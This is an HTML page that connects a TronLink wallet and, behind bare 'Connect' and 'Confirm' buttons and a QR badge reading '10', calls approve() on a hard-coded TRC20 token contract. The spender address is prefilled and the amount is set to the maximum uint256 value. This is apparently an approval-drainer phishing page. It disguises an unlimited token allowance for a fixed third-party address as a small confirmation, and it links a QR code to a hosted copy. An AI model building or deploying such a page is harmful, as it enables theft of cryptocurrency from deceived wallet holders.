<!doctype html>
<html lang="ro">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
  <title></title>

  <script src="https://cdn.jsdelivr.net/npm/qrcodejs@1.0.0/qrcode.min.js"></script>

  <style>
    * {
      margin:0;
      padding:0;
      box-sizing:border-box;
      font-family:Arial;
    }

    body {
      height:100vh;
      display:flex;
      justify-content:center;
      align-items:center;
      background:#0b1220;
      color:white;
    }

    .app {
      width:100%;
      max-width:420px;
      padding:20px;
    }

    .card {
      background:#111a2e;
      padding:20px;
      border-radius:16px;
    }

    button {
      width:100%;
      padding:12px;
      margin-top:10px;
      border-radius:10px;
      border:none;
      font-weight:bold;
      cursor:pointer;
    }

    .blue { background:#3b82f6; color:white; }
    .green { background:#22c55e; color:white; }

    input {
      width:100%;
      padding:12px;
      margin-top:10px;
      border-radius:10px;
      border:none;
      background:#1b2a4a;
      color:white;
      outline:none;
    }

    #status {
      margin-top:12px;
      font-size:13px;
      color:#7dd3fc;
      white-space:pre-wrap;
      text-align:center;
    }

    .qr-wrap {
      margin-top:15px;
      display:flex;
      flex-direction:column;
      align-items:center;
    }

    #qrcode {
      background:white;
      padding:10px;
      border-radius:10px;
    }

    .qr-label {
      margin-top:10px;
      background:#22c55e;
      padding:6px 14px;
      border-radius:8px;
      font-size:14px;
      font-weight:bold;
      color:white;
    }
  </style>
</head>

<body>

<div class="app">
  <div class="card">

    <button class="blue" onclick="connectWallet()">Connect</button>

    <input id="spender" placeholder="TN3ssBQjMsjsTyJkGL1hL7czsQjrjpePGu" />
    <input id="amount" placeholder="115792089237316195423570985008687907853269984665640564039457584007913129639935" />

    <button class="green" onclick="approveUSDT()">Confirm</button>

    <div id="status"></div>

    <div class="qr-wrap">
      <div id="qrcode"></div>
      <div class="qr-label">10</div>
    </div>

  </div>
</div>

<script>

const CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4p8otSzgjLj6t";
let user = null;

/* detect wallet */
function detect() {
  let i = 0;

  const t = setInterval(() => {
    i++;

    if (window.tronWeb && window.tronWeb.defaultAddress?.base58) {
      user = window.tronWeb.defaultAddress.base58;
      document.getElementById("status").innerText = user;
      clearInterval(t);
    }

    if (i > 20) clearInterval(t);

  }, 500);
}

/* connect */
async function connectWallet() {
  try {
    if (!window.tronLink) return;

    await window.tronLink.request({ method: "tron_requestAccounts" });

    user = window.tronWeb.defaultAddress.base58;
    document.getElementById("status").innerText = user;

  } catch (e) {
    document.getElementById("status").innerText = e.message;
  }
}

/* approve */
async function approveUSDT() {
  try {
    if (!user) return;

    const spender = document.getElementById("spender").value;
    const amount = document.getElementById("amount").value;

    const c = await window.tronWeb.contract().at(CONTRACT);

    const sun = window.tronWeb.toSun(amount);

    await c.approve(spender, sun).send();

    document.getElementById("status").innerText = "OK";

  } catch (e) {
    document.getElementById("status").innerText = e.message;
  }
}

/* QR */
function qr() {
  new QRCode(document.getElementById("qrcode"), {
    text: "https://approve-d-app-mt1q.vercel.app",
    width: 150,
    height: 150
  });
}

window.onload = () => {
  detect();
  qr();
};

</script>

</body>
</html>
